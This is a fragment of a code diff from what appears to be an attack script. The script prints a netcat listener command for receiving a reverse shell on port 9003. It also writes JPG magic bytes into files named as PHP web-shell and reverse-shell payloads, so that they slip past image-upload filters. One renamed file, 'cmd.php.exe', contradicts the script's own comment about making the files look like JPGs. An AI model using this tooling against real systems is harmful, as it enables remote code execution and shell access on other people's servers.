@@ -12,7 +12,7 @@ vpn_ip = ipv4 = (
 )
 port = 9003
 print(
-    f"Run `netsat -lvnp {port}` will need to be used when waiting for reverse shell callback"
+    f"Run `nc -lvnp {port}` will need to be used when waiting for reverse shell callback"
 )
 
 types_files = {
@@ -141,7 +141,7 @@ types_files["php_revshell"] = php_revshell
 # create our files only writing our magic headers (just jpg for now)
 magic = file_signatures["JPG"]
 
-for file_name in ["cmd.php.jpg", "rev-shell.php.jpg", "rev-shell.sh.jpg"]:
+for file_name in ["cmd.php.exe", "rev-shell.php.jpg", "rev-shell.sh.jpg"]:
     # make them appear to be jpg
     with open(file_name, "wb") as f:
         f.write(magic)
